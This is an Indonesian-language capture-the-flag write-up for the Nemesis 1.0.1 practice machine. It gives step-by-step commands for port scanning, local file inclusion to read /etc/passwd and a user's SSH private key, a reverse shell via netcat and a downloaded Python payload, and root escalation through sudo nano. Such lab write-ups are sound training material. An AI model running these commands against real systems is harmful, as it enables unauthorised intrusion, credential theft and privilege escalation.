# Laporan Serangan Server Nemesis1.0.1
Ini adalah hasil serangan yang telah dilakukan pada server Nemesis untuk latihan serangan.

## Pencarian IP Address Server

- cek ip pc : 
	- cara 1
		```
		ip a
		```
	- cara 2
		```
		ifconfig
		```

- scan jaringan
	- nmap 
		```
		nmap -sP <network_id>/<prefix>
		```
	- netdicover 
		```
		netdiscover -i <interface>
		```

- uji koneksi, kali linux dan server Nemesis
	```
	ping <ip_server>
	```

## Scan Port Server dengan NMAP
- nmap : 
	```
	nmap -sC -sV -sS -A -p- -oN outNmapNemesis.txt <ip_server>
	```

**Port** yang terbuka dari server adalah :
- http apache (80)
- http nginx (52845)
- ssh (52846)

## Access HTTP (80) & (52845)
- url
```
http://<ip_server>
```
```
http://<ip_server>:52845
```
- cek contact us pada port (52845)
- uji LFI (local file inclusion) pada form message
- ketikkan perintah
```
/etc/passwd
```
- dan klik tombol send message
- jika muncul alert **Messsage has been saved in a file**, jangan dulu tekan oke, tapi langsung tekan **ctrl + u**
- diarahkan ke halaman **view-source:**
- scroll kebawah maka kelihatan
```
<script>alert("Messsage has been saved in a file")</script>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...
...
...
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
thanos:x:1001:1001:Thanos,,,:/home/thanos:/bin/bash
```
- maka username adalah : **thanos**


## Access SSH (52846)
- karena username ditemukan dan terdapat port ssh, serta terdapat vulnerable FLI maka cari key ssh
- ketikkan perintah pada form message
```
/home/thanos/.ssh/id_rsa
```
- klik tombol send message dan ctrl+u
- buat file **key_ssh**
- dan copy private key
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA1H2rDU6AnY2LSnOSLpXxZ7Fb0HPfQQds2SdQzvBH6NNSIuLFsebl
2fAgeirNWD2LHs3C/8jPyy1GRsxFd9U0yF2hO0aRBASSWU+WzLTIeLvaPircn8P1l528cX
...
...
...
KzmgYQleQRM3U3RGpynnimPBzd3NmvpVxBFb3wg/U9rIlrGzzUkwQZRtntox6k3jka8oHd
U5RDT6RIBqdYiiaZAAAADnRoYW5vc0BuZW1lc2lzAQIDBA==
-----END OPENSSH PRIVATE KEY-----

```
- ubah mode dari file **key_ssh**
```
chmod 600 key_ssh
```
- login ssh
```
ssh -i key_ssh thanos@<ip_server> -p 52846
```
- temukan flag1
```
cat flag1.txt
```



## Privilege Escalation
- cek user yang tersedia
```
ls -al /home
```
- access user carlos
```
wget https://raw.githubusercontent.com/Anangprasetya/AttackReport/main/nemesis1.0.1/zipfile.py
```
- sesuaikan ip kali
- buka terminal baru (terminal 2)
```
nc -lvnp 4444
```
- pada terminal 1 (user thanos)
```
cat zipfile.py
```
- tunggu terminal 2 (user carlos)
- mode terminal
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

```
- temukan flag2
```
cat flag2.txt
```
- buka file root
```
cat root.txt
```
- maka terdapat bocoran password : **FUN**
- buka file encrypt
```
cat encrypt.py
```
- temukan password
```
wget https://raw.githubusercontent.com/Anangprasetya/AttackReport/main/nemesis1.0.1/key.py
wget https://raw.githubusercontent.com/Anangprasetya/AttackReport/main/nemesis1.0.1/decrypt.py

python3 key.py
python3 decrypt.py

```
- maka password adalah : **ENCRYPTIONISFUNPASSWORD**
- pada terminal 1 (user thanos)
- login untuk user carlos
```
su carlos
ENCRYPTIONISFUNPASSWORD

```
- uji login root 
```
sudo -l
```
- maka error : **(root) /bin/nano /opt/priv**
- exploit root
```
sudo /bin/nano /opt/priv
```
- setelah nano terbukan tekan **ctrl + R** lalu kemudian **ctrl + X**
- lalu masukkan command pada **command nano**
```
reset; sh 1>&0 2>&0





```
- mode terminal
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

```
- temukan flag3
```
clear
pwd
cd /root
cat root.txt

```